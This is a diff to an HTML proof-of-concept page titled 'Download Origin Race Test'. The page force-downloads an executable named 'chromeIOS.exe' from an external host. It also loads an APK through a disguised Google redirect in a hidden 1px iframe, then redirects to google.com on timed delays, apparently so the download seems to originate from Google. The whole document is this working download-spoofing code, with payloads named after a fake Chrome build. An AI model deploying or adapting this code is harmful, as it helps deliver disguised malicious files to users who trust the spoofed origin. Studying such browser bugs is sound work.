@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Download Race Test</title>
+<title>Race Condition Download Test</title>
 
 <style>
 button{
@@ -13,15 +13,27 @@ padding:15px 30px;
 font-size:16px;
 cursor:pointer;
 }
+#log{
+font-family:monospace;
+margin-top:20px;
+}
+iframe{
+width:1px;
+height:1px;
+border:0;
+}
 </style>
 
 </head>
 <body>
 
 <center>
-<h2>Window.open Download Race Test</h2>
+<h2>Download Origin Race Test</h2>
 <button onclick="start()">Start Test</button>
+<div id="log"></div>
 </center>
+
+<iframe id="frame"></iframe>
 
 <script>
 
@@ -29,34 +41,54 @@ const file="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
 
 function start(){
 
-let delays=[10,50,120,200,320];
+log("Starting race test");
+
+let delays=[20,80,150,250,320,400];
 
 delays.forEach((delay,i)=>{
 
 setTimeout(()=>{
 
-let w=window.open("about:blank");
+log("Attempt delay "+delay+"ms");
 
-w.document.write(`
-<script>
+triggerIframe();
+triggerDownload();
 
-var a=document.createElement('a');
-a.href='${file}';
-a.download='chromeIOS.exe';
-document.body.appendChild(a);
-a.click();
-document.body.removeChild(a);
-
-setTimeout(function(){
-location.href='https://google.com';
-},${delay});
-
-<\/script>
-`);
+setTimeout(()=>{
+window.location.href="https://google.com";
+},delay);
 
 },i*1500);
 
 });
+
+}
+
+function triggerDownload(){
+
+let a=document.createElement("a");
+a.href=file;
+a.download="chromeIOS.exe";
+
+document.body.appendChild(a);
+a.click();
+document.body.removeChild(a);
+
+}
+
+function triggerIframe(){
+
+let frame=document.getElementById("frame");
+
+frame.src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
+
+}
+
+function log(msg){
+
+let d=document.createElement("div");
+d.textContent=msg;
+document.getElementById("log").appendChild(d);
 
 }
 
